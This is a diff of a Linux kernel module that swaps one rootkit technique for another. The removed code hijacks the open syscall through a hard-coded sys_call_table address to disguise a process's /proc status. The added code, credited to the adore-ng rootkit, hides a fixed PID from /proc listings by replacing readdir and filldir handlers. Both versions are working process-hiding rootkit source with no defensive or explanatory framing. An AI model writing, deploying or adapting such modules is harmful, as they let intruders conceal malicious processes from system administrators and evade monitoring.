@@ -1,65 +1,115 @@
-#include <asm/unistd.h>
-#include <asm/cacheflush.h>
-#include <linux/init.h>
-#include <linux/module.h>
 #include <linux/kernel.h>
-#include <linux/syscalls.h>
-#include <asm/pgtable_types.h>
-#include <linux/highmem.h>
-#include <linux/fs.h>
-#include <linux/sched.h>
-#include <linux/moduleparam.h>
-#include <linux/unistd.h>
-#include <asm/cacheflush.h>
-MODULE_LICENSE("GPL");
-MODULE_LICENSE("D0hnuts");
-/*MY sys_call_table address*/
-//ffffffff81601680
-void **system_call_table_addr;
-asmlinkage int (*original_open)(const char *pathname, int flags);
-asmlinkage int open_hijack(const char *pathname, int flags) {
-    /*This hooks all  OPEN sys calls and check to see what the path of the file being opened is
-    currently, the paths must be hard coded for the process you wish to hide, and the process you would like it to impersonate*/
-    if(strstr(pathname, "/proc/2793/status") != NULL) {
-        printk(KERN_ALERT "PS PROCESS HIJACKED %sn", pathname);
-    //The new process location will be written into the syscall table for the open command, causing it to open a different file than the one originaly requested
-        memcpy(pathname, "/proc/2794/status", strlen(pathname)+1);
-    }
-    return (*original_open)(pathname, flags);
-}
-//Make syscall table  writeable
-int make_rw(unsigned long address){
-        unsigned int level;
-        pte_t *pte = lookup_address(address, &level);
-        if(pte->pte &~_PAGE_RW){
-                pte->pte |=_PAGE_RW;
+#include <linux/module.h>
+#include <linux/init.h>
+#include <net/sock.h>
+
+#define HIDEPID 4781
+
+typedef int (*readdir_t)(struct file *, void *, filldir_t);
+
+readdir_t orig_proc_readdir=NULL;
+
+filldir_t proc_filldir = NULL;
+
+/*Convert string to integer. Strip non-integer characters. Courtesy
+adore-ng*/
+
+int adore_atoi(const char *str)
+{
+        int ret = 0, mul = 1;
+        const char *ptr;
+        for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++)
+                ;
+        ptr--;
+        while (ptr >= str) {
+                if (*ptr < '0' || *ptr > '9')
+                        break;
+                ret += (*ptr - '0') * mul;
+                mul *= 10;
+ptr--;   
         }
+
+        return ret;
+}
+
+int my_proc_filldir (void *buf, const char *name, int nlen, loff_t off,
+ino_t ino, unsigned x)
+{
+        /*If name is equal to our pid, then we return 0. This way,
+        our pid isn't visible*/
+        if(adore_atoi(name)==HIDEPID)
+        {
+
+                return 0;
+        }
+        /*Otherwise, call original filldir*/
+        return proc_filldir(buf, name, nlen, off, ino, x);
+}
+ 
+int my_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
+{
+        int r=0;
+                 
+        proc_filldir = filldir;
+        
+        /*invoke orig_proc_readdir with my_proc_filldir*/
+        r=orig_proc_readdir(fp,buf,my_proc_filldir);
+                
+        return r;
+}
+
+int hide_pid(readdir_t *orig_readdir, readdir_t new_readdir)
+{
+        struct file *filep;
+
+        /*open /proc */
+        if((filep = filp_open("/proc",O_RDONLY,0))==NULL)
+        {
+                return -1;
+        }
+        /*store proc's readdir*/
+        if(orig_readdir)
+                *orig_readdir = filep->f_op->readdir;
+         
+        /*set proc's readdir to new_readdir*/
+        filep->f_op->readdir=new_readdir;
+ 
+        filp_close(filep,0);
+
         return 0;
 }
-// Make the syscall table  write protected
-int make_ro(unsigned long address){
-        unsigned int level;
-        pte_t *pte = lookup_address(address, &level);
-        pte->pte = pte->pte &~_PAGE_RW;
+                 
+/*restore /proc's readdir*/
+int restore (readdir_t orig_readdir)
+{
+        struct file *filep;
+                
+        /*open /proc */
+if ((filep = filp_open("/proc", O_RDONLY, 0)) == NULL) {
+                return -1;
+        }
+
+        /*restore /proc's readdir*/
+        filep->f_op->readdir = orig_readdir;
+
+        filp_close(filep, 0);
+        
         return 0;
 }
-static int __init start(void){
-        system_call_table_addr = (void*)0xffffffff81601680;
-    //return the system call to its original state
-        original_open = system_call_table_addr[__NR_open];
-        //Disable page protection
-        make_rw((unsigned long)system_call_table_addr);
-        system_call_table_addr[__NR_open] = open_hijack;
-        printk(KERN_INFO "Open psHook loaded successfully..n");
-    return 0;
-}
-static int __exit end(void){
-        //restore original system call
-        system_call_table_addr[__NR_open] = original_open;
-        //Enable syscall table  protection
-        make_ro((unsigned long)system_call_table_addr);
-    printk(KERN_INFO "Unloaded Open psHook successfullyn");
+         
+static int __init myinit(void)  
+{
+        hide_pid(&orig_proc_readdir,my_proc_readdir);
+         
         return 0;
 }
-module_init(start);
-module_exit(end);
+ 
+static void myexit(void)
+{
+        restore(orig_proc_readdir);
+}
+                 
+module_init(myinit);
+module_exit(myexit);
+ 
+MODULE_LICENSE("GPL");
